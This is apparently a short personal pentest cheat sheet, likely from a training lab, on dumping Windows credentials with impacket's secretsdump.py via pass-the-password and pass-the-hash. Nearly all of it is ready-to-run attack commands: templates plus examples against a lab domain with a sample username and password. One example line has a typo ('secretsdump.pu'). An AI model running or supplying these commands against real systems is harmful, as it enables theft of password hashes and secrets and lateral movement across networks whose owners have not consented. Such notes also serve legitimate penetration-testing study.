-- -
dump all the secrets if you have valid #userpass or valid #userhash .
#### Pass-The-Password
```bash
# target IP is somewhere you can log into with the specified credentials
# probably best to be local admin, crackmapexec will let you know.
# impacket-secretsdump if below doesn't work
secretsdump.py <domain>/<username>:'<password>'@<target ip> 
secretsdump.pu MARVEL.local/fcastle:'Password1'@192.168.138.137
```

^6b4ee1

#### Pass-The-Hash
```bash
# target IP is somewhere you can log into with the specified credentials
# probably best to be local admin, crackmapexec will let you know.
# impacket-secretsdump if below doesn't work
secretsdump.py <username>:@<target ip> -hashes <NTLM hash>
secretsdump.py administrator:@192.168.138.138 -hashes <NTLM hash>
```

^8131e5
